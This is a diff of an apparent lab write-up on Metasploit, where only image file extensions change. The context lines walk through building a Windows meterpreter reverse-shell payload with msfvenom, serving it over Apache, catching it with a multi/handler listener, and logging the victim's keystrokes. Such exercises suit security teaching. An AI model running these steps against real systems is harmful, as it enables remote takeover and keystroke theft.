@@ -30,20 +30,20 @@ Find the attackers ip address using ifconfig
 Create a malicious executable file fun.exe using msenom command
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
 #### OUTPUT
-![Output](Op2-eh6.png)
+![Output](Op2-eh6.jpeg)
 
 copy the fun.exe into the apache /var/www/html folder
 
-![Output](Op3-eh6.png)
+![Output](Op3-eh6.jpeg)
 
 Start apache server
 sudo systemctl apache2 start
 
-![Output](Op4-eh6.png)
+![Output](Op4-eh6.jpeg)
 
 Check the status of apache2
 
-![Output](Op5-eh6.png)
+![Output](Op5-eh6.jpeg)
 
 Invoke msfconsole:
 ## OUTPUT:
@@ -52,7 +52,7 @@ Type help or a question mark "?" to see the list of all available commands you c
 Starting a command and control Server
 use multi/handler
 
-![Output](Op6-eh6.png)
+![Output](Op6-eh6.jpeg)
 
 set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST 0.0.0.0
@@ -68,7 +68,7 @@ Bypass any warning boxes, double-click the file, and allow it to run.
 
 On kali give the command exploit
 
-![Output](Op8-eh6.png)
+![Output](Op8-eh6.jpeg)
 
 To see a list of processes, at the meterpreter > prompt, execute this command:
 ps  ⇒ can see the fun.exe process running with pid 1156
@@ -87,14 +87,14 @@ netstat
 A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
 Notice the "PID/Program name" value for this connection, which is redacted 
 
-![Output](Op10-eh6.png)
+![Output](Op10-eh6.jpeg)
 
 Post Exploitation
 The target is now owned. Following are meterpreter commands for key capturing in the target machine
 keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
-![Output](Op11-eh6.png)
+![Output](Op11-eh6.jpeg)
 keyscan_dump	Shows the keystrokes captured so far
-![Output](Op12-eh6.png)
+![Output](Op12-eh6.jpeg)
 
 ## RESULT:
 The Metasploit framework for reconnaissance is  examined successfully
